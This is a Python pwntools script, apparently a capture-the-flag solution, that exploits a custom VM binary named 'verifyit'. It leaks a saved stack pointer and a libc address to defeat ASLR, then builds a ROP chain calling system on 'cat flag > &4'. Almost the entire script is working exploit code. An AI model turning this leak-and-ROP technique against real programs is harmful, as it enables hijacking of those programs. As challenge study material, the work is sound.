from pwn import *

r = process("./verifyit")
context.binary = elf = ELF("./verifyit")
libc = elf.libc
libc.address = 0
rop = ROP(libc)

def pop(dst, pos_stack):
    return f"0 {dst} 0 {pos_stack} 0"
def push(src, pos_stack):
    return f"1 0 {src} {pos_stack} 0"
def add(dst, src):
    return f"2 {dst} {src} 0 0"
def sub(dst, src):
    return f"3 {dst} {src} 0 0"
def mov(dst, src):
    return f"4 {dst} {src} 0 0"
def load(dst, val_load):
    return f"5 {dst} 0 0 {val_load}"
def print_reg(src):
    return f"6 0 {src} 0 0"
def print_all():
    return f"7 0 0 0 0"

def cmd_load(instr, rcv=True):
    if rcv: 
        r.recv(1000)
    r.sendline(b"load")
    r.sendlineafter(b"n = ", f"{len(instr)}".encode())
    for i in instr:
        r.sendline(i.encode())

def cmd_run():
    r.recv(1000)
    r.sendline(b"run")

def cmd_result():
    r.recv(10000)
    r.sendline(b"result")
    for i in range(74 * 8):
        r.recvline()
    return r.recvuntil(b"> ").decode().strip("> \n")


# ------ OTTENGO LEAK INDIRIZZI ------ #
instr = []
for i in range(76):
    instr.append(print_all())   # dalla pos 74 posso iniziare a mettere instruzioni
for i in range(76, 128):
    instr.append(print_reg(0))

cmd_load(instr)
cmd_run()      

idx = 50

instr[74] = pop(1, 18)
instr[75] = print_reg(1)

c = 0
for i in range(2, 53, 2):
    instr[74+i] = pop(1, idx+c)
    instr[75+i] = print_reg(1)
    c+=1

cmd_load(instr)

aslr_base = 0
data_ptr = 0

data = cmd_result()
for i, l in enumerate(data.split("\n")):
    val = int(l.split("= ")[1].strip())
    if i == 0:
        print("SAVED RBP: " + hex(val))
        data_ptr = val - 176
    
    # print(f"[{idx+i}] = " + hex(val))

    if idx+i == 57:
        aslr_base = val - libc.symbols["__libc_start_main"] - 133

print("ASLR base: " + hex(aslr_base))

pop_rdi = aslr_base + rop.find_gadget(["pop rdi", "ret"])[0]
bin_sh  = aslr_base + next(libc.search(b"/bin/sh"))
ret     = aslr_base + rop.find_gadget(["ret"])[0]
system  = aslr_base + libc.symbols["system"]

# ------ METTO LA ROP ------ #
instr = []
for i in range(76):
    instr.append(print_all())
for i in range(76, 128):
    instr.append(print_reg(0))

cmd_load(instr, rcv=False)
cmd_run()

# cat di flag sulla pipe di write
part1 = int.from_bytes(b"cat flag", "little")
part2 = int.from_bytes(b" > &4\x00\x00\x00", "little")
instr[80] = load(2, part1)
instr[81] = push(2, 0)
instr[82] = load(2, part2)
instr[83] = push(2, 1)

# ROP gayin
instr[84] = load(2, pop_rdi)
instr[85] = push(2, 19)
instr[86] = load(2, data_ptr)
instr[87] = push(2, 20)
instr[88] = load(2, ret)
instr[89] = push(2, 21)
instr[90] = load(2, system)
instr[91] = push(2, 22)

cmd_load(instr)
print(cmd_result())